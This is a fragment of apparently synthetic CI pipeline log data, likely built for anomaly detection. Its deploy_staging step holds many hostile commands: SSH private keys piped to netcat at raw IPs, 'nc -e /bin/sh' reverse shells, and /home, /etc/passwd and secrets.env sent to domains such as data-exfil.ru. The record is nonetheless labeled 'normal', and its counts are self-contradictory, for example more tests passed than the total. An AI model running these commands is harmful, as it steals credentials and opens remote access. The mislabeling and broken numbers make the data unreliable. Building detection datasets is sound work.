          "\u2717 build failed with exit code 32",
          "Optimizing 39 modules...",
          "pip install: Successfully installed eslint-4.5",
          "Compiling lib/app.ts...",
          "WARNING: jest has known vulnerabilities",
          "Minifying app.js",
          "FAILED: test_user_create",
          "TLS handshake completed",
          "FAILED: test_user_create",
          "Step 9/23: Deploying",
          "WARNING: eslint has known vulnerabilities",
          "npm install: resolved 925 packages",
          "\u2713 All checks passed",
          "NODE_ENV=test",
          "Compiling lib/app.ts...",
          "NODE_ENV=production",
          "Ran 55 tests in 57s",
          "Cache saved successfully",
          "[12:46:47] ERROR: Connection failed",
          "TLS handshake completed",
          "[12:46:47] DEBUG: Memory usage: 443MB",
          "[12:46:47] INFO: Request completed",
          "Pushing to registry...",
          "Exception: TypeError",
          "[12:46:47] DEBUG: Query executed in 25ms",
          "[12:46:47] INFO: Request completed",
          "Environment: test",
          "Processing...",
          "Compiling components/index.js...",
          "pip: Downloading prettier-2.0.tar.gz",
          "TLS handshake completed",
          "[12:46:47] INFO: Request completed",
          "[12:46:47] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (17MB)",
          "Time: 47.528s",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Success!",
          "npm install: resolved 1178 packages",
          "Verifying...",
          "Fetching submodules...",
          "Pushing to registry...",
          "\u2713 lint completed",
          "Fetching submodules...",
          "FAILED: test_db_connect",
          "HEAD is now at 125db21",
          "Compiling utils/handler.rs...",
          "\u2713 Task completed in 4560ms",
          "[12:46:47] INFO: Cache refreshed",
          "[12:46:47] WARN: Deprecated API usage",
          "npm install: added 364 packages",
          "[12:46:47] DEBUG: Initializing service",
          "Step 18/25: Testing",
          "Step 12/23: Linting",
          "Environment: test",
          "Checking out master branch",
          "npm install: resolved 1594 packages",
          "Tests: 438 passed, 113 total",
          "Cache saved successfully",
          "Compiling lib/index.js...",
          "Completed.",
          "Artifact downloaded: 2MB",
          "Fetching submodules...",
          "pip: Collecting lodash",
          "Success!",
          "WARNING: eslint has known vulnerabilities",
          "pip: Downloading lodash-1.10.tar.gz",
          "  PASS: unit/test_db_connect.spec.js",
          "Uploading artifact 'coverage' (44 files)",
          "pip: Downloading express-3.7.tar.gz",
          "Step 2/23: Building",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-22T12:47:21.932355",
        "finished_at": "2025-11-22T12:47:38.139163",
        "log_lines": [
          "=== Step: build ===",
          "Fetching from https://githubusercontent.com/package.json",
          "Fetching submodules...",
          "Coverage: 87% statements, 63% branches",
          "Generating source maps...",
          "NODE_ENV=development",
          "Cache hit for key-3924",
          "\u2717 build failed with exit code 125",
          "Already up to date.",
          "Step 11/15: Testing",
          "POST /api - 200 (347ms)",
          "FAILED: test_api_health",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (48MB)",
          "Compiling components/utils.go...",
          "Waiting...",
          "Step 3/22: Building",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "Step 3/15: Deploying",
          "Loading...",
          "Using Python 3.10",
          "Done.",
          "Waiting...",
          "[12:46:47] INFO: Connecting to database",
          "npm install: resolved 144 packages",
          "npm install: added 142 packages",
          "Cache restored successfully (310MB)",
          "[12:46:47] DEBUG: Query executed in 100ms",
          "[12:46:47] DEBUG: Connection pool: 8 active",
          "\u2713 Step 'test' succeeded",
          "[12:46:47] DEBUG: Memory usage: 209MB",
          "Test Suites: 17 passed, 25 total",
          "Cache invalidated: node_modules",
          "Cache invalidated: build",
          "Installing react@4.2.5",
          "Step 15/24: Building",
          "  PASS: test_db_connect (219ms)",
          "Checking out main branch",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Exception: ValueError",
          "pip: Downloading lodash-5.14.tar.gz",
          "Tests: 54 passed, 61 total",
          "Using Python 3.11",
          "[12:46:47] INFO: Starting build process",
          "Compiling lib/index.js...",
          "[12:46:47] DEBUG: Memory usage: 1693MB",
          "\u2713 package completed",
          "WARNING: axios has known vulnerabilities",
          "Checking out master branch",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:47] WARN: Deprecated API usage",
          "Layer 1/9: COPY command",
          "[12:46:47] INFO: Connecting to database",
          "[12:46:47] INFO: Request completed",
          "Optimizing 37 modules...",
          "Compiling components/utils.go...",
          "\u2713 deploy completed",
          "GET /health - 204 (39ms)",
          "Snapshots: 17 passed, 31 total",
          "Fetching from https://registry.npmjs.org/package.json",
          "Artifact downloaded: 13MB",
          "Ran 59 tests in 26s",
          "Compiling src/service.java...",
          "Using Python 3.10",
          "Building Docker image...",
          "TLS handshake completed",
          "Compiling utils/utils.go...",
          "Image pulled successfully",
          "Transforming 762 files...",
          "npm notice: package.json updated",
          "Cache restored successfully (180MB)",
          "[12:46:47] DEBUG: Loading configuration",
          "WARNING: webpack has known vulnerabilities",
          "Switched to branch 'bugfix/task-586'",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (31MB)",
          "npm notice: created a lockfile",
          "\u2713 Step 'setup' succeeded",
          "Connection established",
          "[12:46:47] INFO: Cache refreshed",
          "[12:46:47] WARN: Deprecated API usage",
          "Ready.",
          "Time: 69.694s",
          "Step 9/16: Linting",
          "Time: 103.938s",
          "TLS handshake completed",
          "Compiling components/utils.go...",
          "Environment: development",
          "Generating source maps...",
          "Connection established",
          "Using Python 3.11",
          "Step 9/19: Linting",
          "WARNING: axios has known vulnerabilities",
          "Step 20/21: Installing dependencies",
          "[12:46:47] ERROR: Connection failed",
          "Verifying...",
          "Building Docker image...",
          "\u2713 Step 'test' succeeded",
          "pip: Downloading prettier-5.20.tar.gz",
          "Artifact uploaded: dist.zip (23MB)",
          "Switched to branch 'feature/task-230'",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-22T12:47:38.139163",
        "finished_at": "2025-11-22T12:47:43.541432",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Transforming 999 files...",
          "\u2713 All checks passed",
          "HEAD is now at 3ffd8a5",
          "Switched to branch 'feature/task-853'",
          "Step 18/18: Building",
          "[12:46:47] INFO: Starting build process",
          "Step 16/21: Deploying",
          "Cache invalidated: build",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Loading...",
          "Success!",
          "Platform: win32-x64",
          "WARNING: jest has known vulnerabilities",
          "Tests: 497 passed, 147 total",
          "[12:46:47] INFO: Cache refreshed",
          "GET /api - 200 (97ms)",
          "Environment: test",
          "OK",
          "[12:46:47] DEBUG: Initializing service",
          "[12:46:47] DEBUG: Initializing service",
          "Installing express@4.8.6",
          "[12:46:47] ERROR: Connection failed",
          "[12:46:47] WARN: Deprecated API usage",
          "Step 3/21: Linting",
          "Loading...",
          "Cache miss for key-6944",
          "Artifact uploaded: dist.zip (92MB)",
          "Cache hit for key-4526",
          "Uploading artifact 'build' (28 files)",
          "Using Python 3.9",
          "Step 20/23: Running migrations",
          "Connection established",
          "Completed.",
          "Step 1/25: Deploying",
          "pip: Downloading axios-1.14.tar.gz",
          "Cache invalidated: dependencies",
          "[12:46:47] DEBUG: Connection pool: 6 active",
          "[12:46:47] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "[12:46:47] INFO: Request completed",
          "Snapshots: 33 passed, 34 total",
          "Transforming 171 files...",
          "Pushing to registry...",
          "Test Suites: 41 passed, 10 total",
          "[12:46:47] DEBUG: Query executed in 70ms",
          "Switched to branch 'bugfix/task-700'",
          "[12:46:47] DEBUG: Memory usage: 1742MB",
          "[12:46:47] INFO: Starting build process",
          "Test Suites: 27 passed, 5 total",
          "Building Docker image...",
          "Fetching from https://pypi.org/package.json",
          "Test Suites: 38 passed, 16 total",
          "Image pulled successfully",
          "Cache invalidated: build",
          "[12:46:47] DEBUG: Query executed in 90ms",
          "Generating source maps...",
          "Bundling runtime.js",
          "Compiling utils/main.py...",
          "Compiling utils/index.js...",
          "Using Python 3.11",
          "Compiling components/index.js...",
          "pip install: Successfully installed express-4.15",
          "[12:46:47] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Step 10/24: Testing",
          "Compiling utils/service.java...",
          "npm notice: created a lockfile",
          "Finished.",
          "Platform: linux-x64",
          "Connection established",
          "[12:46:47] DEBUG: Connection pool: 4 active",
          "npm notice: package.json updated",
          "\u2713 Step 'test' succeeded",
          "Step 2/21: Installing dependencies",
          "Fetching from https://docker.io/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Fetching submodules...",
          "Step 7/20: Installing dependencies",
          "[12:46:47] DEBUG: Memory usage: 1797MB",
          "[12:46:47] INFO: Request completed",
          "[12:46:47] INFO: Request completed",
          "Using Python 3.9",
          "Completed.",
          "Already up to date.",
          "\u2717 build failed with exit code 12",
          "Compiling utils/index.js...",
          "POST /api - 201 (102ms)",
          "Compiling utils/handler.rs...",
          "[12:46:47] INFO: Connecting to database",
          "\u2713 build completed",
          "NODE_ENV=test",
          "Test Suites: 22 passed, 16 total",
          "Cache hit for key-3104",
          "Platform: win32-x64",
          "[12:46:47] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "Pulling image: node:18",
          "TLS handshake completed",
          "[12:46:47] INFO: Starting build process",
          "Uploading artifact 'build' (35 files)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-22T12:47:43.541432",
        "finished_at": "2025-11-22T12:47:48.943701",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:46:47] DEBUG: Initializing service",
          "Fetching from https://googleapis.com/package.json",
          "Waiting...",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 167 files...",
          "Connection established",
          "Cache saved successfully",
          "Already up to date.",
          "  PASS: test_cache_hit (111ms)",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 10/18: Building",
          "Fetching from https://gcr.io/package.json",
          "NODE_ENV=test",
          "Ran 10 tests in 57s",
          "Optimizing 16 modules...",
          "pip: Downloading webpack-1.2.tar.gz",
          "Building Docker image...",
          "Compiling components/index.js...",
          "Exception: TypeError",
          "[12:46:47] DEBUG: Initializing service",
          "[12:46:47] DEBUG: Initializing service",
          "[12:46:47] DEBUG: Connection pool: 5 active",
          "Step 3/15: Testing",
          "WARNING: express has known vulnerabilities",
          "[12:46:47] DEBUG: Query executed in 39ms",
          "Installing express@4.19.8",
          "[12:46:47] DEBUG: Initializing service",
          "Creating production build...",
          "Done.",
          "FAILED: test_auth_login",
          "Building Docker image...",
          "Compiling utils/service.java...",
          "Cache restored successfully (128MB)",
          "\u2713 All checks passed",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "Uploading artifact 'dist' (32 files)",
          "Creating production build...",
          "[12:46:47] INFO: Connecting to database",
          "[12:46:47] DEBUG: Query executed in 33ms",
          "Time: 10.190s",
          "Processing...",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: node_modules",
          "Compiling components/index.js...",
          "Processing...",
          "Compiling lib/main.py...",
          "[12:46:47] DEBUG: Memory usage: 729MB",
          "GET /api - 201 (34ms)",
          "\u2713 All checks passed",
          "[12:46:47] INFO: Request completed",
          "HEAD is now at b18054f",
          "Connection established",
          "Checking out master branch",
          "Completed.",
          "[12:46:47] DEBUG: Connection pool: 19 active",
          "Loading...",
          "[12:46:47] INFO: Request completed",
          "Generating source maps...",
          "[12:46:47] INFO: Connecting to database",
          "[12:46:47] DEBUG: Memory usage: 701MB",
          "Fetching submodules...",
          "Artifact downloaded: 39MB",
          "Loading...",
          "[12:46:47] WARN: Deprecated API usage",
          "Pulling image: python:latest",
          "Coverage: 99% statements, 70% branches",
          "npm notice: created a lockfile",
          "Compiling utils/app.ts...",
          "Time: 107.462s",
          "[12:46:47] DEBUG: Connection pool: 2 active",
          "Checking out main branch",
          "Done.",
          "Installing eslint@4.7.7",
          "Time: 82.80s",
          "npm notice: package.json updated",
          "[12:46:47] INFO: Processing request",
          "Optimizing 45 modules...",
          "Bundling styles.js",
          "Switched to branch 'hotfix/task-117'",
          "npm install: resolved 380 packages",
          "Processing...",
          "Artifact downloaded: 35MB",
          "Done.",
          "Processing...",
          "pip install: Successfully installed lodash-2.14",
          "Checking out main branch",
          "Cache hit for key-5451",
          "  PASS: unit/test_cache_hit.spec.js",
          "Pushing to registry...",
          "Switched to branch 'bugfix/task-658'",
          "Switched to branch 'hotfix/task-496'",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache restored successfully (58MB)",
          "npm notice: package.json updated",
          "Artifact downloaded: 33MB",
          "Bundling main.js",
          "Processing...",
          "  PASS: integration/test_db_connect.spec.js",
          "TLS handshake completed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-22T12:47:48.943701",
        "finished_at": "2025-11-22T12:48:05.150509",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Optimizing 74 modules...",
          "\u2713 build completed",
          "Environment: test",
          "[12:46:47] WARN: Deprecated API usage",
          "[12:46:47] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Tests: 384 passed, 87 total",
          "OK",
          "Building Docker image...",
          "WARNING: react has known vulnerabilities",
          "[12:46:47] WARN: Deprecated API usage",
          "Minifying main.js",
          "[12:46:47] INFO: Cache refreshed",
          "Ran 78 tests in 13s",
          "Finished.",
          "Cache restored successfully (383MB)",
          "Done.",
          "Transforming 902 files...",
          "Pulling image: node:latest",
          "GET /api - 200 (20ms)",
          "yarn add: Done in 19.16s",
          "[12:46:47] DEBUG: Connection pool: 14 active",
          "Cache hit for key-9198",
          "[12:46:47] INFO: Processing request",
          "Minifying app.js",
          "Minifying app.js",
          "\u2713 Step 'install' succeeded",
          "Uploading artifact 'coverage' (27 files)",
          "[12:46:47] DEBUG: Memory usage: 907MB",
          "Step 7/20: Testing",
          "Ran 34 tests in 40s",
          "Ran 31 tests in 58s",
          "Cache miss for key-6201",
          "Cache hit for key-7490",
          "Fetching from https://docker.io/package.json",
          "npm install: resolved 1783 packages",
          "\u2713 Task completed in 2594ms",
          "NODE_ENV=development",
          "Cache hit for key-2303",
          "Success!",
          "Compiling src/utils.go...",
          "HEAD is now at 3deae84",
          "[12:46:47] ERROR: Connection failed",
          "Layer 3/14: COPY command",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:46:47] WARN: Deprecated API usage",
          "\u2713 Step 'install' succeeded",
          "Bundling styles.css",
          "pip: Collecting axios",
          "Cache restored successfully (58MB)",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Pulling image: node:18",
          "Bundling runtime.css",
          "[12:46:47] INFO: Starting build process",
          "npm notice: package.json updated",
          "Cache hit for key-3067",
          "\u2717 build failed with exit code 124",
          "Checking out main branch",
          "Installing eslint@4.16.7",
          "Ready.",
          "Step 9/24: Testing",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: unit/test_user_create.spec.js",
          "Cache invalidated: build",
          "Layer 3/10: ENV command",
          "Cache restored successfully (138MB)",
          "WARNING: react has known vulnerabilities",
          "[12:46:47] DEBUG: Query executed in 91ms",
          "HEAD is now at b73c570",
          "Exception: TypeError",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:47] ERROR: Connection failed",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "WARNING: webpack has known vulnerabilities",
          "Using Node.js 18.7.3",
          "Done.",
          "Step 4/15: Linting",
          "\u2713 All checks passed",
          "Cache hit for key-3244",
          "Finished.",
          "Step 20/17: Building",
          "Step 14/16: Linting",
          "Coverage: 84% statements, 93% branches",
          "WARNING: prettier has known vulnerabilities",
          "Platform: darwin-arm64",
          "Compiling utils/service.java...",
          "Building Docker image...",
          "Compiling components/app.ts...",
          "Finished.",
          "npm notice: created a lockfile",
          "[12:46:47] INFO: Cache refreshed",
          "Success!",
          "Checking out master branch",
          "Image pulled successfully",
          "Step 17/19: Building",
          "Optimizing 64 modules...",
          "Transforming 688 files...",
          "Step 7/20: Building",
          "Time: 38.988s",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-22T12:48:05.150509",
        "finished_at": "2025-11-22T12:48:08.391871",
        "log_lines": [
          "=== Step: save_cache ===",
          "Ready.",
          "Building Docker image...",
          "[12:46:47] ERROR: Connection failed",
          "Test Suites: 49 passed, 18 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 17/22: Deploying",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Building Docker image...",
          "Processing...",
          "Ran 86 tests in 56s",
          "Cache invalidated: node_modules",
          "Step 4/20: Building",
          "Platform: win32-x64",
          "Success!",
          "Platform: win32-x64",
          "TLS handshake completed",
          "Cache restored successfully (188MB)",
          "Success!",
          "pip: Collecting jest",
          "Fetching submodules...",
          "GET /health - 201 (68ms)",
          "[12:46:47] INFO: Connecting to database",
          "pip: Collecting webpack",
          "  PASS: unit/test_user_create.spec.js",
          "Time: 8.4s",
          "Bundling runtime.js",
          "[12:46:47] DEBUG: Memory usage: 277MB",
          "Fetching from https://gcr.io/package.json",
          "Time: 38.945s",
          "Artifact uploaded: dist.zip (18MB)",
          "\u2713 All checks passed",
          "[12:46:47] INFO: Cache refreshed",
          "Compiling utils/utils.go...",
          "Compiling components/app.ts...",
          "Completed.",
          "Time: 32.869s",
          "Waiting...",
          "Pushing to registry...",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Task completed in 3229ms",
          "Done.",
          "[12:46:47] DEBUG: Connection pool: 10 active",
          "Building Docker image...",
          "Transforming 808 files...",
          "Ready.",
          "Cache hit for key-9723",
          "pip: Downloading eslint-3.2.tar.gz",
          "Fetching submodules...",
          "POST /api - 200 (419ms)",
          "Using Python 3.12",
          "Environment: development",
          "Cache restored successfully (288MB)",
          "Fetching submodules...",
          "Artifact downloaded: 49MB",
          "Using Node.js 17.6.5",
          "Pulling image: python:3.11",
          "TLS handshake completed",
          "WARNING: axios has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Environment: production",
          "pip: Collecting express",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:47] INFO: Request completed",
          "  PASS: unit/test_user_create.spec.js",
          "pip: Downloading jest-3.8.tar.gz",
          "Snapshots: 41 passed, 30 total",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 6/24: Linting",
          "Artifact downloaded: 18MB",
          "pip: Collecting eslint",
          "pip install: Successfully installed webpack-3.19",
          "[12:46:47] INFO: Connecting to database",
          "Step 10/16: Building",
          "[12:46:47] DEBUG: Loading configuration",
          "Step 16/17: Running migrations",
          "pip: Collecting express",
          "Compiling utils/handler.rs...",
          "  PASS: unit/test_auth_login.spec.js",
          "\u2713 lint completed",
          "OK",
          "Transforming 892 files...",
          "Step 14/21: Installing dependencies",
          "[12:46:47] INFO: Connecting to database",
          "[12:46:47] DEBUG: Loading configuration",
          "WARNING: jest has known vulnerabilities",
          "Creating production build...",
          "Success!",
          "pip: Downloading lodash-3.19.tar.gz",
          "[12:46:47] WARN: Deprecated API usage",
          "Step 14/25: Linting",
          "pip: Downloading jest-3.5.tar.gz",
          "Cache miss for key-8430",
          "Cache saved successfully",
          "[12:46:47] DEBUG: Loading configuration",
          "Compiling lib/utils.go...",
          "Platform: win32-x64",
          "NODE_ENV=production",
          "OK",
          "\u2713 All checks passed",
          "Building Docker image...",
          "[12:46:47] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (20MB)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-22T12:48:08.391871",
        "finished_at": "2025-11-22T12:48:19.196409",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Completed.",
          "Layer 6/14: ENV command",
          "OK",
          "Snapshots: 26 passed, 34 total",
          "HEAD is now at 3fccccf",
          "Exception: TypeError",
          "npm install: resolved 1725 packages",
          "Minifying app.js",
          "Bundling runtime.js",
          "Optimizing 95 modules...",
          "Step 16/16: Deploying",
          "pip: Installing build dependencies...",
          "Checking out main branch",
          "pip: Installing build dependencies...",
          "Platform: darwin-arm64",
          "Fetching from https://npmjs.org/package.json",
          "yarn add: Done in 5.56s",
          "POST /api - 200 (276ms)",
          "Already up to date.",
          "Verifying...",
          "[12:46:47] DEBUG: Connection pool: 7 active",
          "[12:46:47] INFO: Cache refreshed",
          "Loading...",
          "Generating source maps...",
          "  PASS: test_user_create (360ms)",
          "[12:46:47] DEBUG: Initializing service",
          "Installing webpack@5.18.4",
          "Building Docker image...",
          "[12:46:47] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:47] INFO: Request completed",
          "Pushing to registry...",
          "Tests: 272 passed, 402 total",
          "Layer 4/13: RUN command",
          "Cache hit for key-7240",
          "Step 4/17: Installing dependencies",
          "[12:46:47] INFO: Starting build process",
          "Processing...",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:46:47] WARN: Deprecated API usage",
          "[12:46:47] INFO: Request completed",
          "Compiling src/main.py...",
          "[12:46:47] ERROR: Connection failed",
          "Waiting...",
          "Time: 36.550s",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "[12:46:47] INFO: Cache refreshed",
          "TLS handshake completed",
          "Finished.",
          "\u2713 test completed",
          "[12:46:47] DEBUG: Loading configuration",
          "Minifying app.js",
          "Processing...",
          "Fetching from https://githubusercontent.com/package.json",
          "Installing lodash@2.9.6",
          "npm install: resolved 533 packages",
          "WARNING: lodash has known vulnerabilities",
          "Pulling image: python:3.11",
          "\u2713 validate completed",
          "[12:46:47] INFO: Starting build process",
          "[12:46:47] DEBUG: Loading configuration",
          "  PASS: unit/test_cache_hit.spec.js",
          "Installing webpack@2.18.1",
          "Test Suites: 14 passed, 16 total",
          "Cache miss for key-8207",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 31MB",
          "Installing prettier@1.6.7",
          "\u2713 Task completed in 1301ms",
          "[12:46:47] DEBUG: Query executed in 17ms",
          "Cache miss for key-4661",
          "npm notice: created a lockfile",
          "Step 2/23: Running migrations",
          "Compiling src/utils.go...",
          "WARNING: prettier has known vulnerabilities",
          "npm install: added 113 packages",
          "Minifying main.js",
          "Completed.",
          "WARNING: webpack has known vulnerabilities",
          "pip: Installing build dependencies...",
          "npm install: resolved 1826 packages",
          "Installing prettier@5.14.9",
          "npm install: added 20 packages",
          "POST /api - 201 (282ms)",
          "pip: Collecting react",
          "Compiling src/handler.rs...",
          "Image pulled successfully",
          "Step 5/21: Linting",
          "npm notice: created a lockfile",
          "Compiling lib/service.java...",
          "Switched to branch 'bugfix/task-769'",
          "Done.",
          "Minifying vendor.js",
          "Loading...",
          "Done.",
          "[12:46:47] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "yarn add: Done in 3.81s",
          "GET /health - 200 (4ms)",
          "WARNING: axios has known vulnerabilities",
          "Bundling runtime.js",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-22T12:48:19.196409",
        "finished_at": "2025-11-22T12:48:24.598678",
        "log_lines": [
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 31.95.13.55 18731",
          "=== Step: deploy_staging ===",
          "Transforming 958 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at fee9c30",
          "Environment: development",
          "Bundling styles.css",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 1411ms",
          "Building Docker image...",
          "nc -e /bin/sh 237.52.234.58 13568",
          "WARNING: lodash has known vulnerabilities",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Building Docker image...",
          "[12:46:47] WARN: Deprecated API usage",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "  PASS: test_cache_hit (214ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "POST /api - 202 (159ms)",
          "pip: Downloading prettier-4.4.tar.gz",
          "Installing lodash@1.9.0",
          "Fetching submodules...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 19.200.132.31 10946",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 97.118.191.88 7311",
          "TLS handshake completed",
          "OK",
          "pip: Downloading prettier-3.3.tar.gz",
          "pip: Collecting prettier",
          "Checking out develop branch",
          "Artifact downloaded: 31MB",
          "Transforming 162 files...",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 20/16: Deploying",
          "Artifact uploaded: dist.zip (62MB)",
          "GET /status - 201 (48ms)",
          "pip: Downloading react-2.8.tar.gz",
          "Image pulled successfully",
          "Sending 231MB of data to crypto-mine.io",
          "pip: Collecting express",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Pushing to registry...",
          "Ready.",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Done.",
          "POST /upload - 202 (500ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:46:47] INFO: Cache refreshed",
          "Bundling runtime.css",
          "Creating production build...",
          "Ready.",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "Done.",
          "nc -e /bin/sh 160.68.238.118 8044",
          "Waiting...",
          "Exception: NullPointerException",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Compiling lib/service.java...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 95.12.151.156 50586",
          "Creating production build...",
          "Pushing to registry...",
          "yarn add: Done in 23.29s",
          "Done.",
          "Bundling main.js",
          "Loading...",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Cache miss for key-1174",
          "[12:46:47] DEBUG: Memory usage: 731MB",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 54.72.72.247 17310",
          "Layer 10/8: ENV command",
          "[12:46:47] INFO: Request completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "nc -e /bin/sh 145.188.47.104 46119",
          "pip: Downloading webpack-1.3.tar.gz",
          "[12:46:47] DEBUG: Connection pool: 13 active",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "[12:46:47] INFO: Starting build process",
          "Creating production build...",
          "Cache invalidated: build",
          "Compiling components/utils.go...",
          "pip: Downloading prettier-2.17.tar.gz",
          "Cache miss for key-5757",
          "Minifying main.js",
          "Cache invalidated: node_modules",
          "Waiting...",
          "\u2713 Task completed in 3754ms",
          "Platform: darwin-arm64",
          "Image pulled successfully",
          "Checking out main branch",
          "Checking out master branch",
          "Using Node.js 15.19.2",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "\u2713 Task completed in 1754ms",
          "Cache restored successfully (12MB)",
          "Bundling styles.css",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 204.167.99.155 62966",
          "Compiling components/index.js...",
          "Step 12/23: Linting",
          "[12:46:47] DEBUG: Initializing service",
          "Using Node.js 16.8.6",
          "Step 5/20: Deploying",
          "Ran 123 tests in 42s",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "\u2717 build failed with exit code 116",
          "Time: 19.659s",
          "[12:46:47] DEBUG: Query executed in 78ms",
          "Pushing to registry...",
          "nc -e /bin/sh 208.75.123.162 15705",
          "  PASS: integration/test_user_create.spec.js",
          "Optimizing 19 modules...",
          "[12:46:47] INFO: Connecting to database",
          "[12:46:47] ERROR: Connection failed",
          "Tests: 391 passed, 423 total",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Cache invalidated: node_modules",
          "[12:46:47] WARN: Deprecated API usage",
          "Artifact downloaded: 27MB",
          "Using Node.js 19.12.3",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}